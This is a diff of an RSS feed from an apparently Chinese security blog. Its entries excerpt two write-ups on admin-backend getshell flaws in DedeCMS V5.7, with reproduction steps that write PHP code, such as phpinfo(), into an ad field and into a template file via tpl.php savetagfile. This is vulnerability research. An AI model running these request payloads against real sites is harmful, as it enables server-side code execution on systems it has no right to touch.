@@ -1,18 +1,18 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes"?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>DedeCMS on F0rmat&#39;Blog</title>
+    <title>DedeCMS on F0rmat的博客 | 专注于网络攻防和信息安全</title>
     <link>https://getshe11.com/tags/dedecms/</link>
-    <description>Recent content in DedeCMS on F0rmat&#39;Blog</description>
+    <description>Recent content in DedeCMS on F0rmat的博客 | 专注于网络攻防和信息安全</description>
     <generator>Hugo -- gohugo.io</generator>
-    <language>en-us</language>
+    <language>zh-cn</language>
     <lastBuildDate>Fri, 27 Jul 2018 14:14:56 +0000</lastBuildDate><atom:link href="https://getshe11.com/tags/dedecms/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>DedeCMS V5.7后台过滤不当导致Getshell(每周一洞)</title>
-      <link>https://getshe11.com/posts/dedecms-v5.7-background-filtering-improperly-leads-to-getshell/</link>
+      <link>https://getshe11.com/post/dedecms-v5.7-background-filtering-improperly-leads-to-getshell/</link>
       <pubDate>Fri, 27 Jul 2018 14:14:56 +0000</pubDate>
       
-      <guid>https://getshe11.com/posts/dedecms-v5.7-background-filtering-improperly-leads-to-getshell/</guid>
+      <guid>https://getshe11.com/post/dedecms-v5.7-background-filtering-improperly-leads-to-getshell/</guid>
       <description>0x01 前言 前两天看到七月火表哥再先知发的一篇审计文章，感觉不错，是dedecms的getshell。就分析了一下，顺便写一篇文章学习。
 0x02 环境 环境和之前的一篇文章一样可以作为参考： https://getpass.cn/2018/03/10/DedeCMS%20V5.7%20SP2%20Background%20Getshell%20Code%20Execution%20Vulnerability/
 0x03 复现漏洞  进入后台添加广告的地方：http://sb.com/dede/ad_main.php 在添加页面加上我们的代码：--&amp;gt;&amp;lt;?php phpinfo();?&amp;gt;&amp;lt;!--  然后点击查看代码  访问执行代码   0x04 漏洞分析 dede\ad_add.php,代码可以读一遍，插入数据库的时候并没有对危险函数进行处理。
@@ -21,10 +21,10 @@ if($dopost==&amp;#34;save&amp;#34;) { csrf_check(); //timeset tagname typeid nor
     
     <item>
       <title>DedeCMS V5.7 SP2后台Getshell 代码执行漏洞(每日一洞)</title>
-      <link>https://getshe11.com/posts/dedecms-v5.7-sp2-background-getshell-code-execution-vulnerability/</link>
+      <link>https://getshe11.com/post/dedecms-v5.7-sp2-background-getshell-code-execution-vulnerability/</link>
       <pubDate>Sat, 10 Mar 2018 00:11:57 +0000</pubDate>
       
-      <guid>https://getshe11.com/posts/dedecms-v5.7-sp2-background-getshell-code-execution-vulnerability/</guid>
+      <guid>https://getshe11.com/post/dedecms-v5.7-sp2-background-getshell-code-execution-vulnerability/</guid>
       <description>前言 这两天费劲脑力去撩小姐姐，感觉好难啊，还不如审计代码。  环境 Web： phpstudy System： Windows 10 X64 Browser： Firefox Quantum Python version ： 2.7 Tools： PhpStorm 2017.1.1
 复现 漏洞利用  首先访问域名 + /dede/tpl.php?action=upload，在这个页面的源代码中获取到token值。  访问以下地址： 域名 + /dede/tpl.php?filename=shell.lib.php&amp;amp;action=savetagfile&amp;amp;content=&amp;lt;?php%20phpinfo();?&amp;gt;&amp;amp;token=刚才的token值  访问shell的地址：  域名 + /include/taglib/shell.lib.php
 漏洞分析 代码位置和代码 位置： dedecms\dede\tpl.php 代码：
